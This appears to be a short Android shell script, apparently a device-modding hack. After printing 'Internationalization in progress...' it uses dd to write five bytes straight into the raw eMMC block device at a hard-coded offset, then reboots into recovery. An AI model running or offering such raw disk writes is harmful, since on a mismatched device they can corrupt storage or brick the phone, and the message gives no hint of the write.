#!/system/bin/sh
echo "Internationalization in progress..."
echo -e '\x30''\x30''\x30''\x30''\x30' | dd of=/dev/block/mmcblk0 bs=1 seek=797443075 count=5
reboot recovery